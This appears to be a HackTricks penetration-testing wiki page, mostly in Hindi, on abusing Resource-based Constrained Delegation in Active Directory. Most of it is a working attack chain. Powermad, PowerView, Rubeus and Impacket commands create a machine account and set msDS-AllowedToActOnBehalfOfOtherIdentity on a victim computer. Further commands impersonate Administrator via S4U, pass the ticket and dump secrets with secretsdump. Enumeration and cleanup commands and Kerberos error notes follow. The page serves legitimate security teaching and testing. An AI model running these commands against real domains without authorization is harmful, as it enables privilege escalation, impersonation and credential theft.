# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

यह बुनियादी [Constrained Delegation](constrained-delegation.md) के समान है, लेकिन इसके बजाय किसी **object** को किसी मशीन के खिलाफ किसी भी उपयोगकर्ता का **impersonate करने की अनुमति देने** के बजाय, Resource-based Constrained Delegation **object में निर्धारित करता है कि कौन किसी भी उपयोगकर्ता को उसके खिलाफ impersonate कर सकता है**.

इस मामले में, constrained object में एक attribute होगा जिसका नाम _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ होगा और इसमें उस user का नाम होगा जो इसके खिलाफ किसी भी अन्य user का impersonate कर सकता है.

Constrained Delegation की अन्य प्रकारों से एक और महत्वपूर्ण अंतर यह है कि किसी भी user के पास यदि किसी **machine account** पर **write permissions** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) हैं, तो वह **_msDS-AllowedToActOnBehalfOfOtherIdentity_** सेट कर सकता है (अन्य प्रकार के Delegation में आपको domain admin privs चाहिए होते थे)।

### नई अवधारणाएँ

Constrained Delegation में कहा गया था कि user के _userAccountControl_ मान के अंदर मौजूद **`TrustedToAuthForDelegation`** flag की जरूरत होती है **S4U2Self** करने के लिए। पर यह पूरी तरह सच नहीं है। असलियत यह है कि उस value के बिना भी आप किसी भी user के खिलाफ **S4U2Self** कर सकते हैं अगर आप एक **service** हैं (आपके पास SPN है), लेकिन अगर आपके पास **`TrustedToAuthForDelegation`** है तो लौटाया गया TGS **Forwardable** होगा और अगर वह flag नहीं है तो लौटाया गया TGS **Forwardable नहीं** होगा।

हालाँकि, अगर **S4U2Proxy** में उपयोग किया गया **TGS** **NOT Forwardable** है, तो एक **basic Constrain Delegation** को दुरुपयोग करने की कोशिश काम नहीं करेगी। लेकिन अगर आप एक **Resource-Based constrain delegation** का शोषण कर रहे हैं, तो यह काम करेगा।

### हमला संरचना

> यदि आपके पास किसी **Computer** account पर **write equivalent privileges** हैं तो आप उस मशीन में **privileged access** प्राप्त कर सकते हैं।

मान लीजिए attacker के पास पहले से ही **write equivalent privileges over the victim computer** हैं।

1. Attacker किसी ऐसे account को compromise करता है जिसमें SPN है या एक नया SPN बनाता है (“Service A”). ध्यान दें कि कोई भी _Admin User_ बिना किसी अन्य विशेष privilege के अधिकतम 10 Computer objects (_MachineAccountQuota_) तक बना सकता है और उन पर SPN सेट कर सकता है। इसलिए attacker बस एक Computer object बना कर SPN सेट कर सकता है।
2. Attacker अपने victim computer (ServiceB) पर मौजूद WRITE privilege का दुरुपयोग करके resource-based constrained delegation कॉन्फ़िगर करता है ताकि ServiceA को उस victim computer (ServiceB) के खिलाफ किसी भी user का impersonate करने की अनुमति मिल सके।
3. Attacker Rubeus का उपयोग करके ServiceA से ServiceB के लिए एक पूरा S4U attack (S4U2Self और S4U2Proxy) करता है, उस user के लिए जिसके पास ServiceB पर privileged access है।
   1. S4U2Self (SPN compromised/created account से): मेरे लिए Administrator का TGS माँगें (Not Forwardable)।
   2. S4U2Proxy: पहले चरण का Not Forwardable TGS इस्तेमाल करें और Administrator से victim host के लिए TGS माँगें।
   3. भले ही आप Not Forwardable TGS का उपयोग कर रहे हों, क्योंकि आप Resource-based constrained delegation का शोषण कर रहे हैं, यह काम करेगा।
   4. Attacker pass-the-ticket करके user का impersonate कर सकता है और victim ServiceB तक access प्राप्त कर सकता है।

डोमेन का _**MachineAccountQuota**_ जांचने के लिए आप उपयोग कर सकते हैं:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### कंप्यूटर ऑब्जेक्ट बनाना

आप डोमेन के अंदर **[powermad](https://github.com/Kevin-Robertson/Powermad)** का उपयोग करके एक कंप्यूटर ऑब्जेक्ट बना सकते हैं:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation को कॉन्फ़िगर करना

**activedirectory PowerShell module का उपयोग**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview का उपयोग**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### एक पूरा S4U attack करना (Windows/Rubeus)

सबसे पहले, हमने पासवर्ड `123456` के साथ नया Computer object बनाया, इसलिए हमें उस पासवर्ड का hash चाहिए:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस खाते के लिए RC4 और AES hashes प्रिंट करेगा।\
अब, attack किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` पैरामीटर का उपयोग करके केवल एक बार पूछकर कई सेवाओं के लिए अतिरिक्त टिकट बना सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ध्यान दें कि उपयोगकर्ताओं के पास "**Cannot be delegated**" नामक एक attribute होता है। यदि किसी उपयोगकर्ता का यह attribute True है, तो आप उसकी impersonate नहीं कर पाएंगे। यह property bloodhound के अंदर दिखाई देती है।

### Linux tooling: end-to-end RBCD with Impacket (2024+)

यदि आप Linux से ऑपरेट करते हैं, तो आप आधिकारिक Impacket tools का उपयोग करके पूरा RBCD chain निष्पादित कर सकते हैं:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
नोट्स
- यदि LDAP signing/LDAPS लागू है, तो `impacket-rbcd -use-ldaps ...` का उपयोग करें।
- AES keys को प्राथमिकता दें; कई आधुनिक domains RC4 को प्रतिबंधित करते हैं। Impacket और Rubeus दोनों AES-only flows का समर्थन करते हैं।
- Impacket कुछ tools के लिए `sname` ("AnySPN") को rewrite कर सकता है, लेकिन जहाँ भी संभव हो सही SPN प्राप्त करें (उदा., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### एक्सेस करना

अंतिम कमांड लाइन पूरा **S4U attack और TGS** को Administrator से victim host में **memory** में inject करेगी।\
इस उदाहरण में Administrator से **CIFS** service के लिए TGS अनुरोध किया गया था, इसलिए आप **C$** को एक्सेस कर पाएँगे:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न service tickets का दुरुपयोग

के बारे में जानें [**available service tickets here**](silver-ticket.md#available-services).

## एन्यूमरेशन, ऑडिटिंग और क्लीनअप

### RBCD कॉन्फ़िगर किए गए कंप्यूटर एन्यूमरेट करें

PowerShell (SD को डिकोड करके SIDs को सुलझाने के लिए):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read या flush एक ही कमांड में):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD की सफाई / रीसेट

- PowerShell (attribute को साफ़ करें):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: इसका मतलब है कि kerberos को DES या RC4 उपयोग न करने के लिए कॉन्फ़िगर किया गया है और आप केवल RC4 hash दे रहे हैं। Rubeus को कम से कम AES256 hash दें (या सिर्फ rc4, aes128 और aes256 hashes भी दें). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: इसका मतलब है कि वर्तमान कंप्यूटर का समय DC के समय से अलग है और kerberos सही ढंग से काम नहीं कर रहा है।
- **`preauth_failed`**: इसका मतलब है कि दिया गया username + hashes लॉगिन के लिए काम नहीं कर रहे हैं। हो सकता है कि आपने hashes जनरेट करते समय username में "$" डालना भूल गए हों (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: इसका मतलब हो सकता है:
  - आप जिस user को impersonate करने की कोशिश कर रहे हैं वह इच्छित service तक पहुँच नहीं सकता (क्योंकि आप उसे impersonate नहीं कर सकते या उसके पास पर्याप्त privileges नहीं हैं)
  - मांगी गई service मौजूद नहीं है (उदाहरण: अगर आप winrm के लिए ticket मांगते हैं लेकिन winrm चल नहीं रहा)
  - बनाया गया fakecomputer vulnerable server पर अपने privileges खो चुका है और आपको उन्हें वापस देना होगा।
  - आप classic KCD का दुरुपयोग कर रहे हैं; याद रखें कि RBCD non-forwardable S4U2Self tickets के साथ काम करता है, जबकि KCD के लिए forwardable चाहिए।

## Notes, relays and alternatives

- You can also write the RBCD SD over AD Web Services (ADWS) if LDAP is filtered. See:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains frequently end in RBCD to achieve local SYSTEM in one step. See practical end-to-end examples:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- यदि LDAP signing/channel binding **disabled** हैं और आप एक machine account बना सकते हैं, तो **KrbRelayUp** जैसे tools एक coerced Kerberos auth को LDAP पर relay कर सकते हैं, target computer object पर आपके machine account के लिए `msDS-AllowedToActOnBehalfOfOtherIdentity` सेट कर सकते हैं, और तुरंत off-host से S4U के माध्यम से **Administrator** को impersonate कर सकते हैं।

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
